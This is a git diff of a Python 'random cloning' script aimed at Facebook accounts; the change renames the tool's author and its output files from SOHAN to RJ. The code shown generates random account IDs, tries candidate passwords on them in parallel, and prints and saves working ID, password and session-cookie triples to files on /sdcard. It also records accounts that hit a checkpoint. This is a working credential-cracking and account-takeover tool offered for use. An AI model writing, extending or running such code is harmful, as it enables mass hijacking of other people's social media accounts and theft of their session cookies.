@@ -150,19 +150,19 @@ def back():
 	login()
 	
 	
-def SOHAN_S_K1N9():
+def RJ_S_K1N9():
     os.system('clear')
     print(logo)
     print("")
-    print('\033[32;1m[01] RANDOM CLONING ')
+    print('\033[32;1m[01] RANDOM CLONING ')    
     print('\x1b[1;94m════════════════════════════════════════\x1b[1;92')
-    SOHAN = input('\n\x1b[1;32mCHOOSE : ')
-    if SOHAN == '1':
+    RJ = input('\n\x1b[1;32mCHOOSE : ')
+    if RJ == '1':
     	os.system('speak -a 300 "random cloning start"')
     os.system('xdg-open https://www.facebook.com/Mr.ErrorBd0.9')
     time.sleep(5)
-    SOHAN_SN()
-    if SOHAN == '0': 
+    RJ_SN()
+    if RJ == '0': 
         os.system('exit')
         return None
 
@@ -171,13 +171,13 @@ logo = (f"""
 \033[1;32m ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
 \033[1;36m ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
 \033[0;92m┌──────────────────────────────────────┐
-\033[0;92m│ [•] AUTHOR : SOHAN KHAN           
-\033[0;92m│ [•] GITHUB : SOHAN143S               
+\033[0;92m│ [•] AUTHOR : RJ KHAN           
+\033[0;92m│ [•] GITHUB : RJ143S               
 \033[0;92m│ [•] STATUS : PERSONAL         
 \033[0;92m│ [•] TOOLS  :  RANDOM
 \033[0;92m└──────────────────────────────────────┘
 \x1b[1;94m════════════════════════════════════════\x1b[1;92""")
-def linex(): Version : 0.1
+def linex():
 	print('\x1b[1;94m═══════════════════════════════════════\x1b[1;92')
 
 
@@ -198,7 +198,7 @@ def dynamic(text):
         print('\r'+text+o),
         sys.stdout.flush();time.sleep(1)
 # APK CHECK
-def SOHAN_SN():
+def RJ_SN():
     user=[]
     twf =[]
     os.getuid
@@ -231,7 +231,7 @@ def SOHAN_SN():
             uid = code+love
             manshera.submit(rcrack,uid,pwx,tl)
     print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;90mCRACK PROCESS HAS BEEN COMPLETED ')
-    print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;92mIDS SAVED IN SOHAN.txt')
+    print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;92mIDS SAVED IN RJ.txt')
  
 def rcrack(uid,pwx,tl):
     #print(user)
@@ -284,25 +284,25 @@ def rcrack(uid,pwx,tl):
                 if 'LOCK' in res:
                     return 'LOCK'
                 else:
-                    print(f"\r\033[38;5;46m[SOHAN-OK 💚] {uid}|{ps}")
+                    print(f"\r\033[38;5;46m[RJ-OK 💚] {uid}|{ps}")
                     print(f'  \r\033[1;92m   [COOKIE🍪] '+coki)
-                    open('/sdcard/SOHAN RAN.txt', 'a').write( uid+' | '+ps+'|'+coki+'\n')
+                    open('/sdcard/RJ RAN.txt', 'a').write( uid+' | '+ps+'|'+coki+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[SOHAN-CP❌] {uid}|{ps}")
-                open('/sdcard/SOHAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\x1b[38;5;196m[RJ-CP❌] {uid}|{ps}")
+                open('/sdcard/RJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[SOHAN💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[RJ💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
   
         
-SOHAN_S_K1N9()
+RJ_S_K1N9()
